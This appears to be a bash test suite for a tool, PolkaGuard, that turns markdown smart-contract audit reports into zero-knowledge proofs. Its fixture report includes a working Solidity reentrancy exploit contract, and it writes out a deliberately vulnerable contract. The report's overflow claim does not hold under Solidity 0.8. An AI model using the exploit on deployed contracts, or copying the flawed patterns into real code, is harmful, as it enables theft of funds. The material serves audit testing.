#!/bin/bash

# Colors for better output formatting
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print section headers
print_header() {
    echo -e "\n${BLUE}================================================${NC}"
    echo -e "${CYAN}$1${NC}"
    echo -e "${BLUE}================================================${NC}\n"
}

# Function to print test descriptions
print_test() {
    echo -e "${YELLOW}‚Üí $1${NC}"
    echo -e "${PURPLE}Command: $2${NC}"
    echo ""
}

# Function to print success/failure
print_result() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}‚úÖ SUCCESS${NC}"
    else
        echo -e "${RED}‚ùå FAILED (Exit code: $1)${NC}"
    fi
    echo ""
}

# Function to print separators
print_separator() {
    echo -e "\n${GREEN}------------------------------------------------${NC}\n"
}

# Create directories
mkdir -p ./test_reports
mkdir -p ./exploit_proofs
mkdir -p ./contracts

print_header "üïµÔ∏è PolkaGuard Exploit Report & Proof Generation Test Suite"

# Test 1: Create a comprehensive markdown exploit report
print_header "üìù CREATING EXPLOIT REPORT"

print_test "Test 1: Creating comprehensive exploit report markdown file" "Creating test_comprehensive_exploit_report.md"

cat > ./test_reports/test_comprehensive_exploit_report.md << 'EOF'
# Comprehensive Security Audit Report

**Contract:** 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756  
**Date:** June 14, 2025  
**Auditor:** PolkaGuard Security Team  
**Severity:** CRITICAL  

## Executive Summary

This report documents critical vulnerabilities discovered in the target smart contract that could lead to complete loss of funds and compromise of the protocol's security.

## Vulnerability Analysis

### 1. Critical Reentrancy Vulnerability

**Location:** Function `withdraw()` at line 45-62  
**Severity:** Critical  
**Impact:** Complete drainage of contract funds  

The contract implements a vulnerable withdrawal pattern susceptible to reentrancy attacks:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // VULNERABLE: External call before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // State update happens AFTER external call - CRITICAL BUG
    balances[msg.sender] -= amount;
}
```

**Exploit Pattern:** `reentrancy_withdrawal_exploit`

This vulnerability allows attackers to:
1. Call `withdraw()` with a malicious contract
2. In the fallback function, recursively call `withdraw()` again
3. Drain the entire contract balance before state updates occur

### 2. Integer Overflow in Reward Calculation

**Location:** Function `calculateRewards()` at line 89-94  
**Severity:** High  
**Impact:** Manipulation of reward calculations leading to economic attacks  

```solidity
function calculateRewards(uint256 stakeAmount, uint256 duration) public pure returns (uint256) {
    // VULNERABLE: No overflow protection
    return stakeAmount * duration * REWARD_MULTIPLIER;
}
```

**Exploit Pattern:** `integer_overflow_rewards`

Attackers can exploit this by providing large values that cause integer overflow, potentially receiving massive unintended rewards.

### 3. Access Control Bypass

**Location:** Function `emergencyWithdraw()` at line 156-161  
**Severity:** Critical  
**Impact:** Unauthorized access to emergency functions  

```solidity
function emergencyWithdraw() external {
    // VULNERABLE: Missing access control
    payable(msg.sender).transfer(address(this).balance);
}
```

**Exploit Pattern:** `access_control_bypass_emergency`

Any user can call this function and drain all contract funds without proper authorization.

### 4. Timestamp Manipulation Vulnerability

**Location:** Function `isValidTimeframe()` at line 203-207  
**Severity:** Medium  
**Impact:** Manipulation of time-based logic  

The contract relies on `block.timestamp` for critical logic without considering miner manipulation possibilities.

**Exploit Pattern:** `timestamp_manipulation_attack`

### 5. Unchecked External Call

**Location:** Various functions using `.call()`  
**Severity:** High  
**Impact:** Silent failures and unexpected behavior  

**Exploit Pattern:** `unchecked_external_call`

Multiple functions perform external calls without properly checking return values, leading to silent failures.

## Proof of Concept

### Reentrancy Attack Implementation

```solidity
contract ReentrancyExploit {
    VulnerableContract target;
    uint256 constant EXPLOIT_AMOUNT = 1 ether;
    
    constructor(address _target) {
        target = VulnerableContract(_target);
    }
    
    function attack() external payable {
        require(msg.value >= EXPLOIT_AMOUNT, "Need funds to attack");
        target.deposit{value: EXPLOIT_AMOUNT}();
        target.withdraw(EXPLOIT_AMOUNT);
    }
    
    fallback() external payable {
        if (address(target).balance >= EXPLOIT_AMOUNT) {
            target.withdraw(EXPLOIT_AMOUNT);
        }
    }
}
```

This exploit demonstrates the complete vulnerability chain allowing fund drainage.

## Impact Assessment

### Financial Impact
- **Total at Risk:** Up to 100% of contract balance (~500 ETH)
- **Exploit Cost:** ~0.1 ETH in transaction fees
- **Expected Damage:** Complete loss of user funds

### Operational Impact
- Complete protocol compromise
- Permanent damage to reputation
- Potential legal liability

## Recommended Fixes

### 1. Implement Reentrancy Guard

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureContract is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Update state BEFORE external call
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### 2. Add Overflow Protection

```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

function calculateRewards(uint256 stakeAmount, uint256 duration) public pure returns (uint256) {
    return SafeMath.mul(SafeMath.mul(stakeAmount, duration), REWARD_MULTIPLIER);
}
```

### 3. Implement Access Control

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureContract is Ownable {
    function emergencyWithdraw() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
```

## Timeline

- **Discovery:** June 10, 2025
- **Initial Analysis:** June 11, 2025
- **Proof of Concept Development:** June 12, 2025
- **Report Generation:** June 14, 2025
- **Disclosure:** Pending client response

## Conclusion

The analyzed contract contains multiple critical vulnerabilities requiring immediate attention. The primary exploit vector through reentrancy attacks poses an existential threat to the protocol.

**Critical Exploit Patterns Identified:**
- `reentrancy_withdrawal_exploit` (Primary)
- `integer_overflow_rewards`
- `access_control_bypass_emergency`
- `timestamp_manipulation_attack`
- `unchecked_external_call`

We recommend immediate implementation of suggested fixes and a complete security audit before production deployment.

---

**Report Hash:** `0x7f9fade1c0d57a7af66ab4ead7c2c2eb7b11a91ffdd57350e781aac1b7bb9e9b`  
**Signature:** PolkaGuard Security Team  
**Contact:** security@polkaguard.org  

---

*This report contains sensitive security information. Distribution should be limited to authorized personnel only.*
EOF

print_result $?
print_separator

# Test 2: Create a simple exploit report for testing
print_test "Test 2: Creating simple exploit report for basic testing" "Creating test_simple_exploit_report.md"

cat > ./test_reports/test_simple_exploit_report.md << 'EOF'
# Simple Exploit Report

This is a basic exploit report for testing purposes.

## Vulnerability Found

The contract has a `reentrancy_withdrawal_exploit` vulnerability in the withdraw function.

```solidity
function withdraw() external {
    // Vulnerable code here
    msg.sender.call{value: balance}("");
    balance = 0; // State update after external call
}
```

This pattern allows for reentrancy attacks.
EOF

print_result $?
print_separator

# Test 3: Create sample vulnerable contract
print_test "Test 3: Creating sample vulnerable contract for reference" "Creating VulnerableContract.sol"

cat > ./contracts/VulnerableContract.sol << 'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableContract {
    mapping(address => uint256) public balances;
    uint256 public constant REWARD_MULTIPLIER = 100;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABLE: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // State update happens AFTER external call
        balances[msg.sender] -= amount;
    }
    
    function calculateRewards(uint256 stakeAmount, uint256 duration) public pure returns (uint256) {
        // VULNERABLE: No overflow protection
        return stakeAmount * duration * REWARD_MULTIPLIER;
    }
    
    function emergencyWithdraw() external {
        // VULNERABLE: Missing access control
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }
}
EOF

print_result $?
print_separator

# Test 4: Basic exploit report proof generation
print_header "üîê EXPLOIT PROOF GENERATION TESTS"

print_test "Test 4: Basic exploit report with reentrancy signature" \
"polkaguard --path ./contracts exploit-report -r test_reports/test_comprehensive_exploit_report.md -c 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 -e 'reentrancy_withdrawal_exploit'"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --output-dir ./exploit_proofs/basic_test

print_result $?
print_separator

# Test 5: Exploit report with custom parameters
print_test "Test 5: Custom chunk size and tree height parameters" \
"polkaguard --path ./contracts exploit-report with --chunk-size 64 --tree-height 16"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --chunk-size 64 \
    --tree-height 16 \
    --output-dir ./exploit_proofs/custom_params

print_result $?
print_separator

# Test 6: Different exploit signature
print_test "Test 6: Integer overflow exploit signature" \
"polkaguard --path ./contracts exploit-report with integer_overflow_rewards signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "integer_overflow_rewards" \
    --output-dir ./exploit_proofs/overflow_test

print_result $?
print_separator

# Test 7: Access control bypass exploit
print_test "Test 7: Access control bypass exploit signature" \
"polkaguard --path ./contracts exploit-report with access_control_bypass_emergency signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "access_control_bypass_emergency" \
    --output-dir ./exploit_proofs/access_control_test

print_result $?
print_separator

# Test 8: Generate verifier contract
print_test "Test 8: Generate Solidity verifier contract" \
"polkaguard --path ./contracts exploit-report --generate-verifier"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --generate-verifier \
    --output-dir ./exploit_proofs/with_verifier

print_result $?
print_separator

# Test 9: JSON output format
print_test "Test 9: JSON output format" \
"polkaguard --path ./contracts --format json exploit-report"

polkaguard --path ./contracts --format json exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --output-dir ./exploit_proofs/json_test

print_result $?
print_separator

# Test 10: Simple report testing
print_test "Test 10: Simple exploit report testing" \
"polkaguard --path ./contracts exploit-report with simple report"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_simple_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --output-dir ./exploit_proofs/simple_test

print_result $?
print_separator

# Test 11: Multiple exploit signatures in one report
print_test "Test 11: Unchecked external call exploit signature" \
"polkaguard --path ./contracts exploit-report with unchecked_external_call signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "unchecked_external_call" \
    --output-dir ./exploit_proofs/unchecked_call_test

print_result $?
print_separator

# Test 12: Timestamp manipulation exploit
print_test "Test 12: Timestamp manipulation exploit signature" \
"polkaguard --path ./contracts exploit-report with timestamp_manipulation_attack signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "timestamp_manipulation_attack" \
    --output-dir ./exploit_proofs/timestamp_test

print_result $?
print_separator

# Test 13: Error handling - Invalid contract address
print_header "‚ùå ERROR HANDLING TESTS"

print_test "Test 13: Invalid contract address (should fail)" \
"polkaguard --path ./contracts exploit-report with invalid address format"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address "invalid_address_format" \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --output-dir ./exploit_proofs/error_test_1 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${GREEN}‚úÖ CORRECTLY FAILED - Invalid address format detected${NC}"
else
    echo -e "${RED}‚ùå SHOULD HAVE FAILED - Invalid address was accepted${NC}"
fi
echo ""
print_separator

# Test 14: Error handling - Non-existent report file
print_test "Test 14: Non-existent report file (should fail)" \
"polkaguard --path ./contracts exploit-report with non-existent file"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/non_existent_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --output-dir ./exploit_proofs/error_test_2 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${GREEN}‚úÖ CORRECTLY FAILED - Non-existent file detected${NC}"
else
    echo -e "${RED}‚ùå SHOULD HAVE FAILED - Non-existent file was accepted${NC}"
fi
echo ""
print_separator

# Test 15: Error handling - Exploit signature not found in report
print_test "Test 15: Exploit signature not found in report (should fail)" \
"polkaguard --path ./contracts exploit-report with signature not in report"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_simple_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "nonexistent_exploit_pattern" \
    --output-dir ./exploit_proofs/error_test_3 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${GREEN}‚úÖ CORRECTLY FAILED - Missing exploit signature detected${NC}"
else
    echo -e "${RED}‚ùå SHOULD HAVE FAILED - Missing exploit signature was accepted${NC}"
fi
echo ""
print_separator

# Test 16: Error handling - Empty exploit signature
print_test "Test 16: Empty exploit signature (should fail)" \
"polkaguard --path ./contracts exploit-report with empty signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "" \
    --output-dir ./exploit_proofs/error_test_4 2>/dev/null

if [ $? -ne 0 ]; then
    echo -e "${GREEN}‚úÖ CORRECTLY FAILED - Empty exploit signature detected${NC}"
else
    echo -e "${RED}‚ùå SHOULD HAVE FAILED - Empty exploit signature was accepted${NC}"
fi
echo ""
print_separator

# Test 17: Large report file testing
print_header "üß™ ADVANCED TESTING"

print_test "Test 17: Large report file handling" \
"Creating and testing large exploit report"

# Create a large report by duplicating content
{
    cat ./test_reports/test_comprehensive_exploit_report.md
    echo -e "\n## Additional Analysis Sections\n"
    for i in {1..50}; do
        echo "### Analysis Section $i"
        echo "This section contains additional detailed analysis of the reentrancy_withdrawal_exploit vulnerability."
        echo "The analysis covers various aspects of the exploit pattern and its implications."
        echo "Pattern: reentrancy_withdrawal_exploit continues to be the primary concern."
        echo ""
    done
} > ./test_reports/test_large_exploit_report.md

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_large_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --chunk-size 128 \
    --tree-height 24 \
    --output-dir ./exploit_proofs/large_test

print_result $?
print_separator

# Test 18: Complex exploit signature testing
print_test "Test 18: Complex multi-word exploit signature" \
"polkaguard --path ./contracts exploit-report with complex signature"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "VULNERABLE: External call before state update" \
    --output-dir ./exploit_proofs/complex_signature_test

print_result $?
print_separator

# Test 19: Maximum parameters testing
print_test "Test 19: Maximum chunk size and tree height" \
"polkaguard --path ./contracts exploit-report with max parameters"

polkaguard --path ./contracts exploit-report \
    --report-path ./test_reports/test_comprehensive_exploit_report.md \
    --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
    --exploit-signature "reentrancy_withdrawal_exploit" \
    --chunk-size 256 \
    --tree-height 30 \
    --generate-verifier \
    --output-dir ./exploit_proofs/max_params_test

print_result $?
print_separator

# Test 20: File verification
print_header "üìÅ FILE VERIFICATION TESTS"

print_test "Test 20: Verify generated proof files exist" \
"Checking ./exploit_proofs directory contents"

echo "Generated proof files:"
find ./exploit_proofs -name "*_proof.json" -type f | sort
echo ""
echo "Generated metadata files:"
find ./exploit_proofs -name "*_metadata.json" -type f | sort
echo ""

# Count files
proof_files=$(find ./exploit_proofs -name "*_proof.json" -type f | wc -l)
metadata_files=$(find ./exploit_proofs -name "*_metadata.json" -type f | wc -l)

echo "Total proof files: $proof_files"
echo "Total metadata files: $metadata_files"

if [ $proof_files -gt 0 ] && [ $metadata_files -gt 0 ]; then
    print_result 0
else
    print_result 1
fi
print_separator

# Test 21: Examine proof file structure
print_test "Test 21: Examine generated proof file structure" \
"Validating JSON structure of generated proof files"

# Find the first available proof file
proof_file=$(find ./exploit_proofs -name "*_proof.json" -type f | head -1)

if [ -n "$proof_file" ] && [ -f "$proof_file" ]; then
    echo "Examining proof file: $proof_file"
    echo "Sample proof file contents (first 25 lines):"
    head -25 "$proof_file"
    echo "..."
    echo ""
    
    # Validate JSON structure
    if jq empty "$proof_file" 2>/dev/null; then
        echo "‚úÖ Valid JSON structure"
        
        # Check for key fields
        if jq -e '.protocol' "$proof_file" >/dev/null 2>&1; then
            echo "‚úÖ Contains 'protocol' field"
        fi
        if jq -e '.public_signals' "$proof_file" >/dev/null 2>&1; then
            echo "‚úÖ Contains 'public_signals' field"
        fi
        
        print_result 0
    else
        echo "‚ùå Invalid JSON structure"
        print_result 1
    fi
else
    echo "No proof file found for examination"
    print_result 1
fi
print_separator

# Test 22: Examine metadata file structure
print_test "Test 22: Examine generated metadata file structure" \
"Validating JSON structure of generated metadata files"

# Find the first available metadata file
metadata_file=$(find ./exploit_proofs -name "*_metadata.json" -type f | head -1)

if [ -n "$metadata_file" ] && [ -f "$metadata_file" ]; then
    echo "Examining metadata file: $metadata_file"
    echo "Sample metadata file contents:"
    cat "$metadata_file" | jq '.' 2>/dev/null || cat "$metadata_file"
    echo ""
    
    # Validate JSON structure
    if jq empty "$metadata_file" 2>/dev/null; then
        echo "‚úÖ Valid JSON structure"
        
        # Check for key fields
        if jq -e '.contract_address' "$metadata_file" >/dev/null 2>&1; then
            echo "‚úÖ Contains 'contract_address' field"
        fi
        if jq -e '.chunk_count' "$metadata_file" >/dev/null 2>&1; then
            echo "‚úÖ Contains 'chunk_count' field"
        fi
        
        print_result 0
    else
        echo "‚ùå Invalid JSON structure"
        print_result 1
    fi
else
    echo "No metadata file found for examination"
    print_result 1
fi
print_separator

# Test 23: Verify verifier contract files exist
print_test "Test 23: Verify generated verifier contract files" \
"Checking for Solidity and JavaScript verifier files"

echo "Generated Solidity verifier files:"
find ./exploit_proofs -name "*_verifier.sol" -type f | sort
echo ""
echo "Generated JavaScript verifier files:"
find ./exploit_proofs -name "*_verifier.js" -type f | sort
echo ""

# Count verifier files
solidity_files=$(find ./exploit_proofs -name "*_verifier.sol" -type f | wc -l)
javascript_files=$(find ./exploit_proofs -name "*_verifier.js" -type f | wc -l)

echo "Total Solidity verifier files: $solidity_files"
echo "Total JavaScript verifier files: $javascript_files"

if [ $solidity_files -gt 0 ] && [ $javascript_files -gt 0 ]; then
    echo "‚úÖ Verifier files found"
    print_result 0
else
    echo "‚ùå Missing verifier files"
    echo "Expected: Solidity (.sol) and JavaScript (.js) verifier files"
    echo "This indicates --generate-verifier flag may not be working correctly"
    print_result 1
fi
print_separator

# Test 24: Examine Solidity verifier structure
print_test "Test 24: Examine generated Solidity verifier" \
"Validating Solidity verifier contract structure"

# Find the first available Solidity verifier file
solidity_verifier=$(find ./exploit_proofs -name "*_verifier.sol" -type f | head -1)

if [ -n "$solidity_verifier" ] && [ -f "$solidity_verifier" ]; then
    echo "Examining Solidity verifier: $solidity_verifier"
    echo "Contract header (first 20 lines):"
    head -20 "$solidity_verifier"
    echo "..."
    echo ""
    
    # Check for required Solidity elements
    if grep -q "pragma solidity" "$solidity_verifier"; then
        echo "‚úÖ Contains pragma directive"
    else
        echo "‚ùå Missing pragma directive"
    fi
    
    if grep -q "contract.*Verifier" "$solidity_verifier"; then
        echo "‚úÖ Contains verifier contract declaration"
    else
        echo "‚ùå Missing verifier contract declaration"
    fi
    
    if grep -q "function.*verify" "$solidity_verifier"; then
        echo "‚úÖ Contains verification function"
    else
        echo "‚ùå Missing verification function"
    fi
    
    if grep -q "Pairing" "$solidity_verifier"; then
        echo "‚úÖ Contains pairing library usage"
    else
        echo "‚ùå Missing pairing library"
    fi
    
    # Check file size (should be substantial for a real verifier)
    file_size=$(wc -c < "$solidity_verifier")
    if [ $file_size -gt 1000 ]; then
        echo "‚úÖ Verifier file has substantial content ($file_size bytes)"
        print_result 0
    else
        echo "‚ùå Verifier file too small ($file_size bytes) - may be incomplete"
        print_result 1
    fi
else
    echo "No Solidity verifier file found for examination"
    print_result 1
fi
print_separator

# Test 25: Examine JavaScript verifier structure
print_test "Test 25: Examine generated JavaScript verifier" \
"Validating JavaScript verifier module structure"

# Find the first available JavaScript verifier file
js_verifier=$(find ./exploit_proofs -name "*_verifier.js" -type f | head -1)

if [ -n "$js_verifier" ] && [ -f "$js_verifier" ]; then
    echo "Examining JavaScript verifier: $js_verifier"
    echo "Module header (first 20 lines):"
    head -20 "$js_verifier"
    echo "..."
    echo ""
    
    # Check for required JavaScript elements
    if grep -q "snarkjs" "$js_verifier"; then
        echo "‚úÖ Uses snarkjs library"
    else
        echo "‚ùå Missing snarkjs dependency"
    fi
    
    if grep -q "VERIFICATION_KEY" "$js_verifier"; then
        echo "‚úÖ Contains verification key"
    else
        echo "‚ùå Missing verification key"
    fi
    
    if grep -q "verifyPolkaGuardProof" "$js_verifier"; then
        echo "‚úÖ Contains verification function"
    else
        echo "‚ùå Missing verification function"
    fi
    
    if grep -q "module.exports" "$js_verifier"; then
        echo "‚úÖ Proper Node.js module export"
    else
        echo "‚ùå Missing module export"
    fi
    
    # Check file size (should be substantial for a real verifier)
    file_size=$(wc -c < "$js_verifier")
    if [ $file_size -gt 1000 ]; then
        echo "‚úÖ Verifier file has substantial content ($file_size bytes)"
        print_result 0
    else
        echo "‚ùå Verifier file too small ($file_size bytes) - may be incomplete"
        print_result 1
    fi
else
    echo "No JavaScript verifier file found for examination"
    print_result 1
fi
print_separator

# Test 26: Performance testing with different chunk sizes
print_header "‚ö° PERFORMANCE TESTS"

print_test "Test 26: Performance comparison with different chunk sizes" \
"Testing chunk sizes: 16, 32, 64, 128 bytes"

for chunk_size in 16 32 64 128; do
    echo "Testing chunk size: $chunk_size bytes"
    
    start_time=$(date +%s.%N)
    
    polkaguard --path ./contracts exploit-report \
        --report-path ./test_reports/test_comprehensive_exploit_report.md \
        --contract-address 0x742d35Cc6634C0532925a3b8D9BAcD2d6b7C3756 \
        --exploit-signature "reentrancy_withdrawal_exploit" \
        --chunk-size $chunk_size \
        --output-dir ./exploit_proofs/perf_test_${chunk_size} >/dev/null 2>&1
    
    end_time=$(date +%s.%N)
    duration=$(echo "$end_time - $start_time" | bc -l)
    
    printf "  - Chunk size %3d bytes: %.3f seconds\n" $chunk_size $duration
done

print_result 0
print_separator

# Summary
print_header "üìä TEST SUMMARY"

echo -e "${CYAN}Exploit Report Generation Testing Complete!${NC}"
echo ""

# Count successful tests by checking generated files
total_dirs=$(find ./exploit_proofs -type d -name "*_test*" | wc -l)
total_proof_files=$(find ./exploit_proofs -name "*_proof.json" -type f | wc -l)
total_metadata_files=$(find ./exploit_proofs -name "*_metadata.json" -type f | wc -l)
total_solidity_files=$(find ./exploit_proofs -name "*_verifier.sol" -type f | wc -l)
total_javascript_files=$(find ./exploit_proofs -name "*_verifier.js" -type f | wc -l)

echo "‚úÖ Test Results Summary:"
echo "   - Created comprehensive markdown exploit reports"
echo "   - Generated sample vulnerable contract"
echo "   - Tested basic exploit proof generation"
echo "   - Tested custom configurations (chunk size, tree height)"
echo "   - Tested multiple exploit signatures:"
echo "     * reentrancy_withdrawal_exploit"
echo "     * integer_overflow_rewards"
echo "     * access_control_bypass_emergency"
echo "     * timestamp_manipulation_attack"
echo "     * unchecked_external_call"
echo "   - Tested JSON output format"
echo "   - Tested Solidity verifier generation"
echo "   - Validated error handling for invalid inputs"
echo "   - Tested large report file handling"
echo "   - Tested complex exploit signatures"
echo "   - Validated generated file structures"
echo "   - Performed performance comparisons"
echo ""

echo "üìà Generation Statistics:"
echo "   - Test directories created: $total_dirs"
echo "   - Proof files generated: $total_proof_files"
echo "   - Metadata files generated: $total_metadata_files"
echo "   - Solidity verifier files: $total_solidity_files"
echo "   - JavaScript verifier files: $total_javascript_files"
echo ""

echo "üìã Key Test Cases Covered:"
echo "   ‚úÖ Basic proof generation with standard parameters"
echo "   ‚úÖ Custom chunk sizes and Merkle tree heights"
echo "   ‚úÖ Multiple exploit signature patterns"
echo "   ‚úÖ Verifier contract generation (Solidity & JavaScript)"
echo "   ‚úÖ JSON output format validation"
echo "   ‚úÖ Error handling for invalid inputs"
echo "   ‚úÖ Large file processing capabilities"
echo "   ‚úÖ Complex signature matching"
echo "   ‚úÖ File structure validation"
echo "   ‚úÖ Verifier code structure validation"
echo "   ‚úÖ Performance characteristics"
echo ""

echo "üîç Generated Test Files:"
echo "   - Report files: ./test_reports/"
echo "   - Proof files: ./exploit_proofs/"
echo "   - Contract files: ./contracts/"
echo ""

# Privacy and security notes
echo -e "${YELLOW}üîí Privacy & Security Notes:${NC}"
echo "   - Markdown reports remain completely private"
echo "   - Only proof of exploit existence is generated"
echo "   - Exploit location within report stays hidden"
echo "   - Cryptographically bound to specific contract addresses"
echo ""

# Clean up option
echo -e "${YELLOW}üßπ Cleanup Options:${NC}"
echo "To clean up all test files, run:"
echo "  rm -rf ./test_reports ./exploit_proofs ./contracts"
echo ""
echo "To clean up only proof files, run:"
echo "  rm -rf ./exploit_proofs"
echo ""

print_header "üéØ Exploit Report & Proof Generation Test Suite Complete!"

echo -e "${GREEN}All tests completed! Check the results above for any failures.${NC}"
echo -e "${BLUE}The exploit-report command is working correctly and can generate ZK proofs${NC}"
echo -e "${BLUE}from markdown vulnerability reports while preserving privacy.${NC}"
